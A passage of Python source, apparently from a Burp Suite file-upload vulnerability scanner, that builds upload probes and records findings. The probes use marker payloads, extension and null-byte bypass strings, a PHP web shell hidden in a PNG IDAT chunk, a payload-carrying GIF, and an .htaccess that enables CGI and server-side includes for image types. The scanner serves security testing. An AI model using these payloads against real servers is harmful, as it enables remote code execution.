        self._servercode_rce_backdoored_file(injector, self._jsp_gen_payload_expression_lang, self._jsp_rce_params,
                                             formats=used_formats)
        self._servercode_rce_backdoored_file(injector, self._jsp_gen_payload_tags, self._jsp_rce_params,
                                             formats=used_formats)

        # Boring, classic, straight forward jsp file:
        self._servercode_rce_simple(injector, self._jsp_gen_payload_expression_lang, self._jsp_rce_params)
        self._servercode_rce_simple(injector, self._jsp_gen_payload_tags, self._jsp_rce_params)

        # New JSP XML Syntax (.jspx)
        self._servercode_rce_simple(injector, self._jspx_gen_payload, self._jspx_rce_params)

        # rce gif content:
        # TODO feature: change this to something more unique... in general, change that _servercode_rce_gif_content method
        payload_exact_13_len = "${'InJeCtTe'}"
        to_expect = "InJeCtTe"
        lang, types, _ = self._jsp_rce_params(".gif", "image/gif")
        self._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types, expect=to_expect)

    def _asp_rce_params(self, extension, mime, content=""):
        lang = "ASP"
        if mime:
            # TODO feature: include .asa and .asax etc. but we need a Windows test server for that first
            # According to https://community.rapid7.com/community/metasploit/blog/2009/12/28/exploiting-microsoft-iis-with-metasploit
            # the file extension .asp;.png should work fine... see also https://soroush.secproject.com/downloadable/iis-semicolon-report.pdf
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.asp;' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.asp' + self._marker_orig_ext, mime),
                # ('', '.asp.' + extension, ''),
                ('', '.asp;' + extension, mime),
                ('', '.asp' + extension, mime),
                ('', '.asp\x00' + extension, mime),
                ('', '.asp%00' + extension, mime),
                ('', '.asp', ''),
                ('', '.asa', ''),
                ('', '.asax', ''),
                #('', '.asp', mime),
                ('', '.aspx', mime)
            }
        else:
            mime_asp = 'application/asp'
            mime_aspx = 'application/aspx'
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.asp;' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.asp' + self._marker_orig_ext, mime_asp),
                ('', '.asp\x00' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.asp%00' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.asp\x00' + self._marker_orig_ext, mime_asp),
                # ('', '.asp%00' + self._marker_orig_ext, mime_asp),
                ('', '.asp', ''),
                ('', '.asp', mime_asp),
                ('', '.aspx', ''),
                ('', '.aspx', mime_aspx),
            }

        return lang, types, content

    def _asp_gen_payload(self):
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<%= "In"+"Je' + r + 'C" + "t.Te"+"St" %>'
        expect = 'InJe' + r + 'Ct.TeSt'
        return payload, expect

    def _asp_rce(self, injector):
        # automated approach with BackdooredFile class
        self._servercode_rce_backdoored_file(injector, self._asp_gen_payload, self._asp_rce_params)

        # Boring, classic, straight forward asp file:
        self._servercode_rce_simple(injector, self._asp_gen_payload, self._asp_rce_params)

        payload_exact_13_len = '<%= "A"+"B"%>'
        lang, types, _ = self._asp_rce_params(".gif", "image/gif")
        self._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types)

    def _servercode_rce_simple(self, injector, payload_func, param_func):
        payload, expect = payload_func()
        lang, types, content = param_func(None, None, payload)
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Simple" + lang
        title = lang + " code injection" # via simple file upload"
        desc = 'Remote command execution through {} payload in a normal {} file. The server replaced the code {} inside ' \
               'the uploaded file with {} only, meaning that {} code ' \
               'execution is possible.'.format(lang, lang, cgi.escape(payload), expect, lang)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self.sender.simple(injector, types, basename, content, redownload=True)

    def _servercode_rce_backdoored_file(self, injector, payload_func, param_func, formats=None):
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, payload_func, formats):
            lang, types, content = param_func(ext, BackdooredFile.EXTENSION_TO_MIME[ext], content)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "BfRce" + name + lang
            # content_start = content[:content.index(payload)]
            # content_end = content[content.index(payload)+len(payload):]
            title = lang + " code injection"  # via " + ext[1:].upper() + " Metadata "
            desc = 'Remote command execution through {} payload in Metadata of type {}. The server replaced the code {} inside ' \
                   'the uploaded file with {} only, meaning that {} code ' \
                   'execution is possible.'.format(lang, name, cgi.escape(payload), expect, lang)
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Certain", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self.sender.simple(injector, types, basename, content, redownload=True)

    def _servercode_rce_png_idatchunk_phponly(self, injector, types):
        if injector.opts.file_formats['png'].isSelected():
            # PNG with payload in idat chunk that is PHP code taken from https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
            # TODO feature: add other variations of this idatchunk trick. Currently what we do here is simply take the png that has already the idat chunk.
            # We simply assume that a server that is stripping *all* metadata cannot strip an idatchunk as it is part of the image data (obviously)
            # However, we could do other variations of the not-yet-deflated images, that when transformed with imagecopyresize or imagecopyresample
            # would even survive that. When implementing that, a generic approach which allows resizing first to sizes self._image_formating_width,
            # self._image_formating_height etc.
            lang = "PHP"
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "IdatchunkPng" + lang
            content_start = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\"
            content_end = "X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3}\xaa'\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\nF\xc1(\x18\x05\xa3`\x14\x8c\x82Q0\n\x86\r\x00\x00\x81\xb2\x1b\x02\x07x\r\x0c\x00\x00\x00\x00IEND\xaeB`\x82"
            # TODO feature: here we use a modified payload that is also an idat chunk
            code = "<?=$_GET[0]($_POST[1]);?>"
            content = content_start + code + content_end
            # we expect the server to simply execute "code", but as the parameters in $_GET and $_POST do not make sense
            # it will fail and simply cut off the image right before "code". In practice this means an HTTP 500
            # is returned and the body only includes content_start. Therefore this tests checks if "content_start"
            # is in the body and that "code" is for sure not in the body
            expected_download_content = content_start
            title = lang + " code injection" # via PNG IDAT "
            desc = 'Remote command execution through {} payload in IDAT chunks, payload from https://www.idontplaydarts' \
                   '.com/2012/06/encoding-web-shells-in-png-idat-chunks/ . The server probably tried to execute the code' \
                   ' {} inside the uploaded image but failed, meaning that {} code execution seems possible. Usually ' \
                   'the server will respond with only the start of the file which has length {} and cut off the rest. ' \
                   'Also, it usually responds with an HTTP 500 error.'.format(lang, cgi.escape(code), lang, str(len(content_start)))
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content, not_in_filecontent=code))
            self.sender.simple(injector, types, basename, content, redownload=True)

    def _servercode_rce_gif_content(self, injector, lang, payload_exact_13_len, types, expect="AB"):
        if injector.opts.file_formats['gif'].isSelected():
            # TODO: PHP not working, simply returns payload <?echo "AB"?> inside GIF, at least on my test server... I guess
            # the PHP parser already stopped looking for <? when it reaches the payload as too much garbage...
            # However, it *does* get properly detected for JSP tomcat servers where it is injected with ${}!
            # TODO feature: defining expect as "AB" is pretty stupid as that is not really unique....
            # GIF with payload not in exif but in file content that survives PHP's getimagesize() and imagecreatefromgif()
            # https://www.secgeek.net/bookfresh-vulnerability/#comment-331
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "InContentGif" + lang
            start = 'R0lGODlh1wBUAPf/APz9/ubr9Jx5G+ru9uTq9LikaP3opuXNiWB8hP378fb4++zw9+/y+OrUmenXp+Tp882tXWqFi9zCeNa5bP7yyfr6/eHI' \
                    'gcetZ09mbfDz+ZOXeN7EfExiaNbDh9m8cVF8ieLo8fv8/fDZm7Cztff4/P3ik+js9fDy+ODGfq6qhunRjP767OLJg9S3afL0+cyxabOaWv700' \
                    'f722Obq9KKacFlyelB6h/3+/omWhOjctdq+dNCxYdO6dMe6haWCJ/TpzNvAdqmKNl96gvHepvP1+jxlaNjc5P7uusq0clt1fFZudffu1fz8/V' \
                    'JpcOLm7EleZFx2fvHhsfP2+vv37P7+9/755PHlxNK0ZauTVrqaQ7yfVXyBbuDHgNm3WOju9mlzaPv1493i6eK1U+ziw3SJgvHXkOvw9vPkueT' \
                    'Mh6iMRP7ssbOSOl55gOvhvMaWMenu9eS8Z7a5wN+rQerNhMHFzFF5hsjM0te6bujt9fvuxaONUjBRVOPKhdS9evfpvM3R1//++/jtzNLX4ObJ' \
                    'fv39/vj5/MCkXL3Bx9WqTU94hevv9sSkUuPp89GyY+7y9+vu9NPSyNm/ePbqw62SSvH0+Z+CNubPi93Del2BhcaoXfHmyPL1+e7x+Ozn0V14f' \
                    '/f5++jDbdvCfYqKb7CNMu7x92F8gv733uvLikdbYNXAgODCc8rFsurKevjx3c2tVZ+GQ+Dl72SAh1dxePDy9+PLhVpnYV55gZ6gglRtdFx4gN' \
                    '/Aa1l/hti7cH+QgubKglN9iFp0e/fmsd7JiPr7/V5xcf379vf17uHMi+3w9V11fNO1Z1tyef7+//T2+v7+/vn6/Pj6/PX3+/7///////X3+vb' \
                    '3+/T3+/n7/e3x91dwd/T3+lRsc/n6/f7//v/+/////vr7/Pj6/eTp9PT2+//+/u3y9/X2+s+wYO3y+PX2+2F9hc+vXzheYdC3ceXRmefs9fb3' \
                    '/MioV/fouPXx5Vd9h199hrWEJP7wwd29Z+fr8F97gr+tc+nIeFlwdVVvd////yH5BAEAAP8ALAAAAADXAFQAAAj/ANUJHEiw4MBYEQwqXMiwo' \
                    'UF6HyJKnEixosWJNj7YsPGvo8ePIEOKHEmypMmTKFOKdGgQYSwELAcimEmzps2bC+v9usiz50WOKoMKHUq0aMiYBxPGvMm0adOBpXbt/DDVp1' \
                    'WMGYEa3cq1a1GkAiPEaugUgb6zaNOqPetUHb2qV+NS1Oq1rt27Hpe6ZMh07VkhgAMLFlIqFplevXAoVoyYTCy4cq9u1Ii3suWtSMUq7Kt2sBB' \
                    'boEPbOnwrRY8OwiypVn3ggLAOPVLcIhMhctzJl3PrRhkzglKCnP8GDs2mOBtPyCPgMH1AhYrVq1u3RnOM1rFjwmL3qm2bZ9bd4MN//2TpGybw' \
                    'mmkFgy6OvD0UKGRMO3cO3ZL0+2jy09pPiw+tHrNR1d1F4hW4m0O+FWRTeoCt59577yXRSwodWPJcfQfYZ990+aFBi4f78cEHC7QIk0oKZAxok' \
                    'YEsWtZQeTItKNxnxyEHIYRJxNcBffWxhl+H+oXIwogsFGmBBancEgFkttHV4pNcLYTQb+rIqM9wNd4IRRJcQqFBKj1G9+MBQfbXX5FoHmkBF2' \
                    'r2gAOTkUEpZ5QtaRbjTAzakiWOSQADTA3xZdjjfdIBqZ9/Iqap5ppcNIoCCqGksKSKc1ZKVJ1j3WmWcHraiKOfNdQAjCg9hLnhj2UKmSYLRzb' \
                    'q6qOPbv9wSQ+9wGmVpbiqVNBeAlnZ4HE39vlnqMtosCN0hJJJZochikhkmmy+CusG1FY7qwZ1JKKtDXVcleu3JhHEa5XoXUmjp1sOW4Mssixz' \
                    'S2piospsf86uuqijsKJQLbWXXCLBJTzcAtFG2hacSEYVgavwSmHZSS6enAIbIajrZpNNP7eggay8QdaLppGt4jvtvpfI6q8EEvRxC5M2GFzHZ' \
                    'B8sLHNe6iSoKVoNottnqLJYrIQSGfuIH5kf8kcvC66uscaajOYbq7Umn4yyBED0oYGtGrW87cwzT6kgxOba4unO6/bszzZNiCJMssqCaHS9XG' \
                    'wQygUCCDCBo1w8vW/U/07/TTUQgPeBA8I9ccu1zA73Cva5nkzMcza4YIABB1t0kCyzINZLpAWh9NGOD1pcEES+e/Pbr9R/Aw64Djq0k6K3hyu' \
                    'c6c3mSpxuDdmgzQEGTTRBTA+FLpuqx0ai0AcSMAgARwMC7KC3tf36jbLqqrPO+j6YwB77t19DDJjtwMiCNu9NbGN+EykUOi9/iSq6Zijt7COA' \
                    'G6cE44oPe58uferVW2+9Byu71fa4d55N5ew9wFBCEzBgPn8o4XxpM5Tb6PUsVoVsA8ebhADk0ABJlMEHizAd6qZGPR0AwX8eSKEKe0E4Ag0wV' \
                    'wXkVOPEVz5/mA0XEPzd+ihYwVa1agORaEcB/+YnhjMEogwt8MHpUAcE/vnvfyr0AC94gT2fvBCGivOeLWrgjyb4IxuPUwIO0bZAGoDIQ4iqoA' \
                    'VdlTdI9eECafCBGMTwg1aIQASjyMIIqbe6J0YxhVO8wx2u1pMr4upOZ8mFLHCBixpw6U89EyMZF/iFVITITB8DWbTwBUQkDBERYgDFEsAwBBG' \
                    'EQgAeIGH//PjHKQbyDhNAAndcaMg5ZVEIUPBHIz9VMUn2boEYoMEBKPgxNTWqadMKBQ9ENwo4wGEOrZhCFKIwhCysgX8nZGUUXSlIWMJyAoSk' \
                    'ZS2h1Ct9AMOGSRCb4244SckRIxWIKua9RKYvWR0veboABSgaAP+GKVghCjlwhwBa0EdtAtKVvOjmBBY6gRYgIRY8GactaQIMW5wLgaHKhi7bO' \
                    'TkNZNICa9wk6fgVxH34IAv84AcrhgCGBPygDW2IghZGkU0UbpObCmVoQxuqgYhKlJzeE4LEksAzB0JQchioxT7kycY2jqxaKbtA8uZAVRWcYQ' \
                    'rFeClMoyAACEDxpq/UqU5bQNYWFGAX4vypgWjyF3XeLpJHnRwHviAM9yHzeaaLhCd9EA/nlKGDWP1BDnIwhjG8wAc6aOUru/lNhpb1sS94XcL' \
                    'U2qKgSmxYGsVh7yTHgc7SwIIhc1rpTAaEZcLABw0owx2HEIgEFEMTDnAAYa0ggHj/3JSxjR3rY1ugjN72dEWUZZEWG/dWo26WsxxQqjDYKFqS' \
                    'LVECOvCkAPoggiFY9wytKMYUYCvbNnSiAwLQAUIFOYHcLnS3Ze1tb88K3OAWSB9m+R5xIZmNB5IRuU94Jz3rmb/ntk4LAghCMIYwzTP8AAxUm' \
                    'MIYHOAOB3h3CaOoLWPFel70qre3V7jCBSA6WfeKRwhtJe7OZLHR43aWA0/YgtP461ypRcIDhvCBDzoQgzyc4QySkMQSpgAIfzLYwZ1YQgzAy1' \
                    'cKoze96s2wklnYYQ+Dhw1/uWwvz4dcFD9BA04t3XOpFgkdXCDCL/ADBWJgihhIIhCjnIIzErBgdxC2/xUykEGNXyCAUZyjwha+sJIz3IhG/JY' \
                    'iThYPFK7UqeJqFpgnfgIHaDCI/PFtal1uR4S1EIx7jFkGpqhCFVoRzQQAIquDzcE8NC1nCtwjGABeQyN2q2dl7JnPfaYBWgEdaPAkg9Dzzah9' \
                    'Ed3ZJzxBqS3WH5c90I41CCALIlDDEShAAUxXYQUJWAEYVlAMZxSjFWPIwRKiXQVTlPoeahBBFgSgamXwFsOufnWf112A7NG61rpJhnwNfV+5W' \
                    'rkWSNBXyYQ9PR3wINWDMICyLR0DGTw7AVSgAsKpQA4mzKMT8yhGArj97SOowQC+MHYWePtqWK+7ETtoRLubDG/LLOMzIv/OaImr7OtfR2KJTI' \
                    'wELwwhAB/oogQGEPgR7lHwgyecCoAI+jeYYAxj/FzhK6hCqS2e8xLoQsaLUPfHQ76Dql/A3RMpuW5O7lb6PtDEvfZ1LWS1PyBEggeZ8IEAulC' \
                    'Ctit7zJmGdsKDDohv2H0ahCjGN+gOCKST2tRHaHoJulDzeHwc5FVP/DnOsY7HvFvrlTk5sEZcYl5b+df7i4TMJS0AV+Cc55qGdjGATne7m34a' \
                    'qE+96U1PdypIPOkyoEDgS+CKOq878TtYvO7PweGsQ97k7LldZsdn75ajohZMFG87RCeAFxhg2c5eAbShnYApWP/6U5j4pyeO/exXv/rST3r/m' \
                    'cFdAgjU+Ry4z/3u19F4yPze5G4lKu6+bvmWY76J1VtmAWCgh7qxHedvRwGBgGY/UIA/oAlWYAWaMAXTkFUImICaEIEFOIB5kAeBZwBtR3ggtA' \
                    '6NsHu6tw6Mdw6u0HsS8X6R13VTBnZWhgrHx0dAQGwXsH9YoAevUHM3l3PKdgTycGPTlAOx5QCtAAgNCFsN0GANEFvWZV3BIHAY+HQCMAlaAAH' \
                    'op34fyH7sBwGY4H4meBfLgIIkdmjF52ssWAvtUFA6cAcvEIMwgAUzWAl1FnADp4PT5AAi4A7uEAhC91pFGDcsoDENsFpLaACDYGxBAANakAkQ' \
                    'sA47AIKMZ4VX/wgBmYB1JbiFdrEMkwdJKxeGTzCG++BHvDABy5cJMqgHeuCGyHYEy5YHfnAGURBbSzB331AMVtAAEiAiG8ACFrJaBlAG41YJh' \
                    'mgIiOiIwrgOEFCMEMBej0eJXAEMl4g7mZhoYsiCBcA6HpBYKnQH7ZCG+7eGNKh2lGZpqsiKpjBxQBeLmtAAl4APdjgIzXFH4iYAlQCFh1iMVt' \
                    'iIxkiPxegKskZyymgUSdCM9UVlYciCLEgDfyRFgTQBL6CNaziDNdh8YpYHkiAD0rdw5tgAKKAKqvCHaOAcmVBzk2CIiCiFjUiMiXiPKEkDv6C' \
                    'F/cgVUDB5ulZv0EiQqCAKihVWLf+QhpmgBdxIg3VDYzFQcHEHdFmFkfqykfLAA3WTBoYYD8E4jCgZlRAgCi0UES3ZFZ7ABhESkyoYjSz4BRMg' \
                    'RQipUN/EW2loCDw5gz4ZBBUYCBSwBKbAYwkwi6wyCCjAD0EgAEypBcBIj8IolVJJBjsBF1fJFWPDlQtUBIq5mIzZmI75mOwQmXswmZMpAKkgD' \
                    '36QY4EABhI3i77gC4MwCB+5B5HJDo95mqiZmqq5mqzZmq75mrC5mvGHmBhQBIxwm7iZm7q5m7oJArAAC0YgCH9AB3EwArfgAwQWDMFwBkvQmQ' \
                    '0wBwcwB4MgACMgCEbwmyDAm9q5ndzZnd75neAZnuL/OZ7cWQSzOX/3VQQEQAAP8ACMwJ4EwAgPEJ/vyZ7zKZ/0KZ/zGZ+/aQR/cAjF+QoQUF3' \
                    'WFQjZdwbzMQeLkAZGEAYgkJ3uuZ742Z73SZ/iQJ8PcKEReqHyeZsSSp/xGaLr6Z7z2Z7v+Z73WZ8RiqGMcKEimqH1OaL7OaPrGaIm2qEtKqEV' \
                    'mps1CqIeup8nyp4daqP1eZvmqZVbQpvq6aI9up5M2qQySgAaOqKMAJz/aZw+oAJloFpXNQVnUAbOMQcCsAqwEKM1aqY9mqFPCp/7OaJpCqVSC' \
                    'qVtuqZs2qRtCqV0WqMueqc9Kg7zuadwGqfw6aSBeqdTyp4uWgRC1Tjy/xeQm6WeBBAAARCpkwqllQqnkyqpPQoLgmAHxakHWVBVLCVNW8qLMA' \
                    'AL63mplBqokcqqrtqjqgqrrwqrmRqosVqjmtqqqTqrrVqrs5qpt+qqigqQK1cEwNqrwDoDlFqrkqqsq1qpAQACYfCfxSkAusAKrFAG0TQEWzq' \
                    'dkAACy9qsksqsATAD4yqu55qu44qs4aqp6tquwOqu6rquBGCu7kqp9pqq5Wqv8dqv6aqs5xqukcqvuwqt6wqsw8qomKhZtXmu7yCpDzuvEJuu' \
                    'EVuxkwqcnjoCejAK+jQHS1AF3FoGa1AAsBAAEWuyEPuwJ5uyJnuyK2uxLfsOMjux46qyLP+Lsi2LszSrsjYrszYbsxPrsyvrsDS7szUrsTmrr' \
                    'hVrsQ+bsPSWmEIbtVI7tVTrsw8QBoJAnCMgAIgAB6BwYCVQBqogAEYAAlUbtTF7tmq7tjPLtm4rtWn7tm+bs1MbtzyLtorqhcbVBEUgs3iAB+' \
                    '/wt4H7t4RLuCYAuH97uIkbuD6LB9FqBHZwCCNAA/YwR2cABm03CvtgtopbuHiguKALuIdrAu/QuYDLuJ/rt4YbuIqruqPruYQ7uKZruKT7ubY' \
                    '7uLaLuKmbu7Cru4aLuK2buqQru7ubu65burG7uKWbt7kGV71TBHjgBXjwBl7wBtErvdb7t9lLuNvrBd77t9X/q70B4ARZW61uIAYOEAMlgA8+' \
                    'AAviIL3gG7/ga73067nd27vWC7/ce7/bq72Ei73UC7vSG77R+7+eC7/Zm78J7L/cC7v5y8D/27/928DfK7/Ty7xbiZ5oUwRv0MEdPAAD8MFvA' \
                    'MIg7MEmXMIhHMIeHMJ4IK3UegsbdAr3UAI+0AMPML0kvMIj/MEovMMjrMIq7MMpvMJDDMQ/HMQ8bMIirMRFrMMnnMI9vMNBjMRKvMQl7MM8fM' \
                    'VYHMVY/MNFcCXN+IUbrAgkrAhmbMYgTMZnvMZpvMZnPABqrAh44ARGoLU+YA+gcARdUAkP8A5uHMdv7MZl/Md/DMeBDMeGTMaI/0zIaKzGg6z' \
                    'IjYzGg7zIgVzIjCzIb2zIbVzJjxzJmbzGX4xyGEViX1cEC7DGC2AGqawIp3zGZmAGrgzLr+zGC7DKZjy+wxkHKcC1JTCmfgzLijDLfyzLqEzM' \
                    'wczKwSzLwMzKtazKqpzMwdzKy8zKqnzKzZzMsCzNZ3zKr7zKryzMspzKyyzM26zMrZzM3jzL2UzM3ZzKtezK4rzMpxzK5+mopowNtZzPC4DP+' \
                    '4zP/KzP/wzQ/ZzPAwACkAuglWAPL5AG+YAM+RzQ+rzPEQ3RtczP2EDREV3REp3RHH3RAG3RGD3QG23RGv3Q/nzRJ/3P/izQHj3RD53RKx3Q2E' \
                    'DPYf+8UUWA0hddDijtCDmN0+iADaRw0ZyA0kHtCD+t0zwN1I9AvsS5ywIACY8A1KTACVSN0zkd1FMt1UF90aTQ1Ty91VaN1UJ90Ue91UMN1I4' \
                    'w1KTw01LN1VNdDlmt1VzNCViN1We91iit02CNDWdd1Wet0+gw1HeN06TgCF+NDXBN2OjQ1VZN11Y901HWvEZVBIZt2Axg2ZxQ2Zp92ZftCJed' \
                    '2ZzNCQzAAIU92oaNDfkwrYdAB1gAAyaADJ4d22nN2bPt2Z0N2ppt2Z092qBt2rJt2bE92qYt3J3926Kt2wwg2sVt2Li92Zzt28tN29Kd259d2' \
                    'cMt3L9t3bb93MNt24b//cW4lsH1hQtFwAAZcN7ofd7mjd4nsN4ZcAInkAHCnd7o7d7xjQx0/Ad/YAQNLd/qfd7wHd/0Xd/+/d7pvd7tXeD03d' \
                    '7uTd/mHd8MIOD+bd72PeAFTuH/7eD/HeHyjeEPPuDr3eASHuLvLeEHnuAA/uARXgTxVWiUR96UQAkZEOPoTeMyLuMznuM6HuM3zuP0LeNLbQR' \
                    'G4ASPMAs97uM5buMzjuM1buM87uNPfuRRTuNJft443uNJLuVHvuROruQ3vuTpHeVWLuU6XuNc3uVPXuZQHuUsHmIYNX9FsAmU4AKbIOcu4AIx' \
                    'jud4XuebQOdy/ud0HuiUUOeD3ueGPguP/5AP+VDkfI7ng07nc27ngz7ndy7nk77nkH7nes7nPM7plU7pe+7pde7nhX7phc7now7olg7pp+7nf' \
                    't7nPE7qjU7oo67pqD7pfz7rkc7qtd7oc97muKaw6+IPcb4JRGDsmyAFREAEyn7syy4Fdc7szr7szM7n1Z7s0M7sLjAL3B7py27sxw7tyU7t4C' \
                    '4FzU7tzG7uyr7u0Z7u1J7t6/7t1Z7t5E7vyg7uyC7t1s7nzd7v0q7vx47s7a7v+X7uyY7v4w7wxm7u157tC1/n/c7nLG5AUg=='
            start = start.decode("base64")
            end = '8RgvBc2gDSEP8hoP8iT/8Rxf8uYe8tZQ8h7f8S6/8eP/sPIkL/LaQPMhPw4i3/Egrw03X/I7b/JSsPMeL/LmfvNSwPFEP/Qqj/HjkPIwf/Ib//JF' \
                  'n/LWQPI1P/VE//Iz7/E93ww6n/RND/JQH/MvP/EhJuyyUATUQA3aEA3mYA7W8PbR0AzREA3WEA10P/fjQA16Tw3W0PbWkA54n/dtHw1uH/h3//Z' \
                  'tz/h6bw1y//aQf/d4//bm0PfjkPeI3/Zy3wzWYPja0PbpEPiHb/dwrw2kH/h5b/ibP/hwr/mC7/PpYA6V7/eLv/mID/uSD/h3z/p6z/htH/y8f/' \
                  'e2j/g+7/efX/iA7/qUD/jLz/uKTw0TH1+LmsFFoADRoAAKUA3c/6/93r/9218N2D/+2C/+2a/94o/+3t/96y/+6f/966/+8J/979/+2h8N9W/+C' \
                  'gAP4Q8QCgQOJFhNQTWEAg0SVHiQYbRoDhk2HJiQ4sKFDDEOjNgwY8GODjNmjFYEwUl9+oTYYuMJShJgNYqQ+ESChIJPAmneVECzZ86cNml+IlrT' \
                  'pkCiP2sCrYnz502jS30SHUpVKFWcSXVODYqUadaiQZdGjYq0p9OhN4XuZLvz7E+cbsUOHBqXK9Wib9veLVtE3UkEKVe6fAmsSKFPhQpB+wQNsWL' \
                  'FjRk7VkzZMbTLiIlCpowYc+bEkT9vblw6MePFixOXzuw5dWjIpzsvnk37Mf/mx5wrf4ac2vbp1bkr+84dfDLv4LlRgw7tmHRvaH4BC2ZJOEmRZ9' \
                  'm5QQsHLfszaNy4PRu//TO3cOAxZ/dOfn37Z93Bp08PXrt39Oq9c4/vfv/n79gTz70A7UvvPfXCObC++NrbL8Dx3KMvvADh+4y+A/UbDz77+otQv' \
                  'ULIizA/AdmjkD/1susuHL/+QkklWzwhrIhrrqmAmwqu4eaaYYbhsYIKfORRR3BqvOaZYYpMssZhgqzxmR+BTLLHHcFJEspnguzxxiGBzPGZIrlp' \
                  'ckkcbexxyTFrLNLKI8Epc8phwIQSHDfZ5EZJK5tU8shr9uzxxyGLNDLLOPsEJ8gK6Dz/cssch9TRyBwPrQDKQSElMlAhoWxxOpUGgwKKIoYJocd' \
                  'RRTV11BBSLXVVUlk9M9VXUX311FbPnJXUW3E1tVZbe+3VVVhFlVVYX1W9VdZShV012VxtHZZZZZ31dVpUjR2mRRcD67QlUFUNgQkAvGWCCW+/FT' \
                  'dVctEtd1xV01U3XXjJhbdcdc+tN9526W3XXXbf3Tdcftc1t95vxyUXAHnN5ZdfgAcOIdyC55XXXYfzrRdbwLRdqaUixgUAYYPBBfdjhEsemWSUT' \
                  'xb5Y4NZBnlkmE32GGWXSVaZZphXXpnlmUv+mJCYa075ZJ93phlnnWX2eOmga+75aJNxLhrbbFOC/5GNIm4A4AZCfv6Ya0LCFnvsG7g2u2ywzQZA' \
                  'bLXL3npts8PWmuyy2V577a7JDvvuseEmmZC488477a3B3rtuwcdOXGy4Affb8bzx7trwvftGvOufKU98a8fxNnxtqqvu1Jaszw6bGcBTv4EZZ9i' \
                  'u+wZnYK8bdUJij7v11mU32/baewdcd7Z/z71sZ4YHPPbeDWcGbbSXL172sJ+3PfffVYeeeNlZP9t22JGfHvHLVz/emeXFRx7t4qPXPX3ka2ce8N' \
                  'AzFkyIIli3n3Xy7+9GGmZY76Z/8pGPf/4rXv8MaMAA8s8Z/FOgNALYjeI543//y1//FLjA4kFwgf3rxv8cmNm/CBaQggZ0oAH/h78KDrCD+YMgM' \
                  'ygoQRcKEIQPXKA0BrjBDWrQhswoYfEYaL8QcrCALhRiB3l4wRKGLlsaK4I3pvG/b3iDh/2bBuvIQUVnOHEa3vgG66TRjWl84xs2JN80yCGNaUhD' \
                  'imZ0ojf2h8Y0MnCMbVRjFKVxxTTyMI1xnMYe0ciMKzrQhl1sozfQ6A0n9q+LNnTiN6qIxi92sYqPTGM3xshDb5yRGVrsYxv/18ct9rEb5HDkFpk' \
                  'RSkOSA4yb7OMY0XjGPLqxj0fkXx8POUBGIpIZRQgIADs='
            end = end.decode("base64")
            content = start + payload_exact_13_len + end
            expected_download_content = start + expect + end
            title = lang + " code injection" # via GIF Content"
            desc = "Remote command execution through {} payload in GIF image format analogous to https://www.secgeek.net/bookfresh" \
                   "-vulnerability/#comment-331 . The server replaced the code {} inside the uploaded image with {}, meaning that " \
                   "{} code execution seems possible. This image survives PHP's getimagesize() and imagecreatefromgif(), therefore" \
                   " it is likely that in general the part where the payload was injected into the image might survive other " \
                   "conversions too.".format(lang, cgi.escape(payload_exact_13_len), expect, lang)
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Certain", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content))
            self.sender.simple(injector, types, basename, content, redownload=True)

    def _htaccess(self, injector, burp_colab):
        htaccess = ".htaccess"
        title = ".htaccess upload"
        content = "Options +Indexes +Includes +ExecCGI\n" \
                  "AddHandler cgi-script .cgi .pl .py .rb\n" \
                  "AddHandler server-parsed .shtml .stm .shtm .html .jpeg .png .mp4\n" \
                  "AddOutputFilter INCLUDES .shtml .stm .shtm .html .jpeg .png .mp4\n"
        desc = ".htaccess files can be used to do folder specific configurations in Apache. A filename of {} was " \
               "uploaded with content '{}' and detected that the page later on includes the string 'Index of /'. " \
               "This could mean that the .htaccess we uploaded enabled a directory listing. Additionally it enabled " \
               "server side includes, if you can upload files with a server side include extension they can now be " \
               "executed. ".format(htaccess, content)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Medium")

        urrs = self.sender.simple(injector, Constants.HTACCESS_TYPES, htaccess, content, redownload=True, randomize=False)
        # We only need to do this for one, not for all
        urr = urrs[0]
        if urr and urr.download_rr:
            url = FloydsHelpers.u2s(self._helpers.analyzeRequest(urr.download_rr).getUrl().toString())
            try:
                path = urlparse.urlparse(url).path
            except ValueError:
                # Catch https://github.com/modzero/mod0BurpUploadScanner/issues/12
                path = None
            if path:
                path_no_filename = path.rsplit("/", 1)[0] + "/"
                self.dl_matchers.add(DownloadMatcher(issue, filecontent="Index of /", url_content=path_no_filename))
                self._send_get_request(urr.download_rr, path_no_filename, injector.opts.create_log)

        if not burp_colab:
            return []

        # Interesting way with a web.config file
